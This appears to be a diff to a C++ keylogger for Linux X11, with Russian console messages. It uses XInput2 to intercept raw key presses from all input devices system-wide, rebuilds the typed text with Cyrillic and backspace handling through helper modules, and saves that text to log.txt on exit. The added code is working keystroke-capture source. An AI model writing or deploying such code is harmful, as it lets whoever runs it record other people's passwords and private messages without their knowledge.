@@ -3,8 +3,23 @@
 #include <X11/extensions/XInput2.h>
 #include <X11/keysym.h>
 #include <X11/XKBlib.h>
+#include <string>
+#include <fstream>
+#include <cstring> 
 
+#include "utils/cyrillicHelper/cyrillicHelper.hpp"
+#include "utils/specialKeysHelper/specialKeysHelper.hpp"
+#include "utils/keyPressHelper/keyPressHelper.hpp"
 
+static void writeLog(const std::string& log_buffer) {
+    std::ofstream file("log.txt");
+    if (!file) {
+        std::cerr << "Не удалось открыть файл для записи!" << std::endl;
+        return;
+    }
+    file << log_buffer;
+    file.close();
+}
 
 int main() {
     Display* display = XOpenDisplay(NULL);
@@ -20,15 +35,12 @@ int main() {
         return 1;
     }
     
-
     Window root = DefaultRootWindow(display);
     
     XIEventMask evmask;
     unsigned char mask_bytes[XI_LASTEVENT] = {0}; 
-
     XISetMask(mask_bytes, XI_RawKeyPress);
-    XISetMask(mask_bytes, XI_RawKeyRelease);
-
+    
     evmask.deviceid = XIAllMasterDevices; 
     evmask.mask_len = sizeof(mask_bytes);
     evmask.mask = mask_bytes;
@@ -39,11 +51,12 @@ int main() {
     std::cout << "Пассивный перехват запущен. Нажимайте клавиши..." << std::endl;
     std::cout << "Нажмите Escape для выхода." << std::endl;
 
-  
-    bool isShiftPressed = false;
-  
+    std::string log_buffer = "";
+    XkbStateRec state;
     XEvent xevent;
+
     while (true) {
+        XkbGetState(display, XkbUseCoreKbd, &state);
         XNextEvent(display, &xevent);
         
         if (xevent.xcookie.type == GenericEvent && xevent.xcookie.extension == xi_opcode) {
@@ -51,33 +64,25 @@ int main() {
 
             if (xevent.xcookie.evtype == XI_RawKeyPress) {
                 XIRawEvent* rawev = (XIRawEvent*)xevent.xcookie.data;
-
-                KeySym keysym = XkbKeycodeToKeysym(display, rawev->detail, 0, (int)isShiftPressed);
                 
-                if (keysym != NoSymbol) {
-                    const char* key_string = XKeysymToString(keysym);
-                    printf("Нажата клавиша: symbol=%s\n",
-                           key_string ? key_string : "Unknown");
+                KeyPressResult result = process_key_press(display, rawev, state);
 
-                    if (keysym == XK_Shift_L) {
-                        isShiftPressed = true;
-                    }
-
-                    if (keysym == XK_Escape) {
-                        XFreeEventData(display, &xevent.xcookie);
-                        break; 
-                    }
+                if (result.should_exit) {
+                    std::cout << "Нажата клавиша: " << result.printable_name << std::endl;
+                    XFreeEventData(display, &xevent.xcookie);
+                    break;
                 }
-            } 
 
-            if (xevent.xcookie.evtype == XI_RawKeyRelease) {
-                XIRawEvent* rawev = (XIRawEvent*)xevent.xcookie.data;
-                KeySym keysym = XkbKeycodeToKeysym(display, rawev->detail, 0, (int)isShiftPressed);
-                const char* key_string = XKeysymToString(keysym);
-                printf("release:%s\n", key_string);
+                // if (result.printable_name) {
+                //     std::cout << "Нажата клавиша: " << result.printable_name << std::endl;
+                // }
 
-                if (keysym == XK_ISO_Next_Group) {
-                    isShiftPressed = false;
+                if (!result.char_to_log.empty()) {
+                    if (result.char_to_log == "\b" && !log_buffer.empty()) {
+                        log_buffer.pop_back(); 
+                    } else if (result.char_to_log != "\b") {
+                        log_buffer += result.char_to_log;
+                    }
                 }
             }
             
@@ -85,7 +90,10 @@ int main() {
         }
     }
 
-    std::cout << "Завершение работы..." << std::endl;
+    std::cout << "Завершение работы... Запись лога..." << std::endl;
+    writeLog(log_buffer);
+    std::cout << "Лог записан в log.txt" << std::endl;
+    
     XCloseDisplay(display);
     return 0;
 }
